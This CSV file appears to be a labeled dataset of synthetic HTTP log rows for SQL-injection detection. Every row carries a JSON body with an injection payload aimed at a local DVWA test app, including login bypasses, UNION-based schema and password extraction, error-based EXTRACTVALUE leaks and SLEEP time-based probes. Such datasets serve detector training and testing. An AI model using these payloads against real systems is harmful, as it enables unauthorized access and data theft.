ip,timestamp,method,url,path,query,protocol,status,size,response_time,referer,user_agent,decoded_url,decoded_query,body,decoded_body,content_type,is_json_payload,json_depth,param_count_body,attack_type,existing_label
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,511,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""search"": ""' UNIoN ALL SELECT null, column_name,null From information_schema.columns ;-- -"", ""page"": 16}","search ' UNIoN ALL SELECT null, column_name,null From information_schema.columns ;-- - page 16",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2430,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""user"": {""name"": ""test' AND (SELECT COUNT(*) FROM users)>46 -- -"", ""role"": ""user""}}",user name test' AND (SELECT COUNT(*) FROM users)>46 -- - role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2607,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""query"": ""laptop' UNION Select column_name,null /*"", ""limit"": 35}","query laptop' UNION Select column_name,null /* limit 35",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2139,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""username"": ""admin' or 100<200 "", ""password"": ""50""}",username admin' or 100<200  password 50,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2003,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""username"": ""admin' OR 1=1 --"", ""password"": ""89""}",username admin' OR 1=1 -- password 89,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2464,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""username"": ""admin' OR 100<200 --"", ""password"": ""95""}",username admin' OR 100<200 -- password 95,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,923,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""query"": ""laptop' UNION SELECT column_name,null "", ""limit"": 12}","query laptop' UNION SELECT column_name,null  limit 12",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2430,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""items"": [{""id"": ""1' OR 7=7 ;-- -"", ""qty"": 1}]}",items id 1' OR 7=7 ;-- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,1667,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""id"": ""1' and EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) /*""}","id 1' and EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) /*",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,2239,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/search,,"{""comment"": ""test' AND CASE WHEN (CHAR(97)='a') THEN 1/0 ELSE 1 END "", ""post_id"": 48}",comment test' AND CASE WHEN (CHAR(97)='a') THEN 1/0 ELSE 1 END  post_id 48,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2027,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""comment"": ""test' And Case when (100<200) ThEn 1/0 elsE 1 END /*"", ""post_id"": 45}",comment test' And Case when (100<200) ThEn 1/0 elsE 1 END /* post_id 45,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2945,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""username"": ""admin' OR ASCII('A')=65 --"", ""password"": ""70""}",username admin' OR ASCII('A')=65 -- password 70,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,3364,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""username"": ""admin' or 'a'='a' ;-- -"", ""password"": ""26""}",username admin' or 'a'='a' ;-- - password 26,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,4235,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/profile,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""99""}, ""remember"": true}",auth username admin'-- - password 99 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,840,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""order_by"": ""id' Union Select 1,version() From information_schema.tables --""}","order_by id' Union Select 1,version() From information_schema.tables --",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,1841,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""data"": {""search"": ""' Or 1=1 #"", ""category"": ""all""}}",data search ' Or 1=1 # category all,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,643,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""filter"": {""user_id"": ""1' And SLEEP(5) /*"", ""status"": ""active""}}",filter user_id 1' And SLEEP(5) /* status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,709,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""items"": [{""id"": ""1' Or 2>1 --"", ""qty"": 1}]}",items id 1' Or 2>1 -- qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,708,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/users,,"{""items"": [{""id"": ""1' Or 100<200 #"", ""qty"": 1}]}",items id 1' Or 100<200 # qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,2774,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""items"": [{""id"": ""1' OR 2>1 /*"", ""qty"": 1}]}",items id 1' OR 2>1 /* qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,615,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/auth,,"{""filter"": {""user_id"": ""1' AND SLEEP(2) /*"", ""status"": ""active""}}",filter user_id 1' AND SLEEP(2) /* status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,548,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""88""}, ""remember"": true}",auth username admin'-- - password 88 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,1108,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""items"": [{""id"": ""1' OR CHAR(97)='a' #"", ""qty"": 1}]}",items id 1' OR CHAR(97)='a' # qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,1683,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""query"": ""laptop' UNION SELECT 1,2 ;-- -"", ""limit"": 13}","query laptop' UNION SELECT 1,2 ;-- - limit 13",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,1169,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""items"": [{""id"": ""1' OR 'a'='a' ;-- -"", ""qty"": 1}]}",items id 1' OR 'a'='a' ;-- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,1440,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""user"": {""name"": ""test' and (SELECT COUNT(*) From users)>43 /*"", ""role"": ""user""}}",user name test' and (SELECT COUNT(*) From users)>43 /* role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3030,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/profile,,"{""order_by"": ""id' UNION SELECT column_name,null FROM dvwa.users -- -""}","order_by id' UNION SELECT column_name,null FROM dvwa.users -- -",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,835,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/query,,"{""items"": [{""id"": ""1' Or LENGTH('test')=4 ;-- -"", ""qty"": 1}]}",items id 1' Or LENGTH('test')=4 ;-- - qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,1205,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""id"": ""1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) ""}","id 1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) ",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,1992,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/users,,"{""user"": {""name"": ""test' And (SELECT COUNT(*) from users)>49 /*"", ""role"": ""user""}}",user name test' And (SELECT COUNT(*) from users)>49 /* role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2438,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/rest/items,,"{""search"": ""' UnIOn ALL select null, column_name,null From dvwa.users --"", ""page"": 14}","search ' UnIOn ALL select null, column_name,null From dvwa.users -- page 14",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2387,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""id"": ""1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE user='admin'))) /*""}","id 1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE user='admin'))) /*",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3178,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""items"": [{""id"": ""1' OR ASCII('A')=65 /*"", ""qty"": 1}]}",items id 1' OR ASCII('A')=65 /* qty 1,application/json,1,3,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,3121,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/auth,,"{""data"": {""search"": ""' or 1=1 /*"", ""category"": ""all""}}",data search ' or 1=1 /* category all,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2229,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/rest/items,,"{""user"": {""name"": ""test' AND (SELECT COUNT(*) FROM users)>46 --"", ""role"": ""user""}}",user name test' AND (SELECT COUNT(*) FROM users)>46 -- role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,4051,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""query"": ""laptop' UNIoN SELECT 1,version() "", ""limit"": 7}","query laptop' UNIoN SELECT 1,version()  limit 7",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,3564,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""query"": ""laptop' UNION SELECT 1,version() "", ""limit"": 47}","query laptop' UNION SELECT 1,version()  limit 47",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,3905,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/auth,,"{""filter"": {""user_id"": ""1' AND SLEEP(1) -- -"", ""status"": ""active""}}",filter user_id 1' AND SLEEP(1) -- - status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,1119,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/auth,,"{""query"": ""laptop' UNION SELECT user,password "", ""limit"": 10}","query laptop' UNION SELECT user,password  limit 10",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,3277,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""17""}, ""remember"": true}",auth username admin'-- - password 17 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,3627,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""72""}, ""remember"": true}",auth username admin'-- - password 72 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,3240,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/auth,,"{""filter"": {""user_id"": ""1' AND SLEEP(2) -- -"", ""status"": ""active""}}",filter user_id 1' AND SLEEP(2) -- - status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,730,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""16""}, ""remember"": true}",auth username admin'-- - password 16 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,2156,1,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/query,,"{""user"": {""name"": ""test' aND (SELECT COUNT(*) from users)>49 "", ""role"": ""user""}}",user name test' aND (SELECT COUNT(*) from users)>49  role user,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,1930,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""search"": ""' union ALL Select null, column_name,null from dvwa.users ;-- -"", ""page"": 37}","search ' union ALL Select null, column_name,null from dvwa.users ;-- - page 37",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,2305,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""query"": ""laptop' UNION SELECT column_name,null "", ""limit"": 2}","query laptop' UNION SELECT column_name,null  limit 2",application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/query,/api/v1/query,,HTTP/1.1,200,4354,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/query,,"{""order_by"": ""id' union select table_name,table_schema From information_schema.tables /*""}","order_by id' union select table_name,table_schema From information_schema.tables /*",application/json,1,1,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/auth,/api/v1/auth,,HTTP/1.1,200,880,1,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",/api/v1/auth,,"{""auth"": {""username"": ""admin'-- -"", ""password"": ""4""}, ""remember"": true}",auth username admin'-- - password 4 remember True,application/json,1,2,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,2378,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/search,,"{""filter"": {""user_id"": ""1' AND SLEEP(5) "", ""status"": ""active""}}",filter user_id 1' AND SLEEP(5)  status active,application/json,1,2,1,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/search,/api/v1/search,,HTTP/1.1,200,4056,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/search,,"{""username"": ""admin' OR 'a'='a' ;-- -"", ""password"": ""21""}",username admin' OR 'a'='a' ;-- - password 21,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/users,/api/v1/users,,HTTP/1.1,200,3761,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api/v1/users,,"{""comment"": ""test' anD cASE WHEN (1=1) Then 1/0 ELSE 1 end "", ""post_id"": 30}",comment test' anD cASE WHEN (1=1) Then 1/0 ELSE 1 end  post_id 30,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/api/v1/profile,/api/v1/profile,,HTTP/1.1,200,2848,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/api/v1/profile,,"{""username"": ""admin' OR 7=7 #"", ""password"": ""55""}",username admin' OR 7=7 # password 55,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,2332,0,http://127.0.0.1/dvwa/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/rest/items,,"{""username"": ""admin' OR 7=7 "", ""password"": ""54""}",username admin' OR 7=7  password 54,application/json,1,1,2,sqli_json,1
192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/rest/items,/rest/items,,HTTP/1.1,200,971,0,http://127.0.0.1/dvwa/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",/rest/items,,"{""order_by"": ""id' union SELECT 1,version() fRoM dvwa.users ;-- -""}","order_by id' union SELECT 1,version() fRoM dvwa.users ;-- -",application/json,1,1,1,sqli_json,1
